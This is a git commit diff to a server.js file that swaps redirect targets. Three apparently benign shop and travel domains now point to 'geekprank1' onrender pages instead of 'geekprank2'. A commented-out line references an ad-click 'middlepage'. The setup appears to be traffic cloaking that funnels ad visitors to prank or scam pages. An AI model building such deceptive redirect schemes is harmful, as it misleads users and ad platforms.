a61da44ed607150534d4235ac17cce5f6b7c650e
naresh7km <naresh7km@gmail.com>
2026-05-22 06:38:14 +0530

    Update server.js

--- server.js
+++ server.js
@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.shop": { method: "redirect", target: "https://geekprank2.onrender.com/?naotoshi" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank2.onrender.com/?takahiro" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank2.onrender.com/?hiroaki" },
+    "https://naotoshidairy.shop": { method: "redirect", target: "https://geekprank1.onrender.com/?naotoshi" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank1.onrender.com/?takahiro" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank1.onrender.com/?hiroaki" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
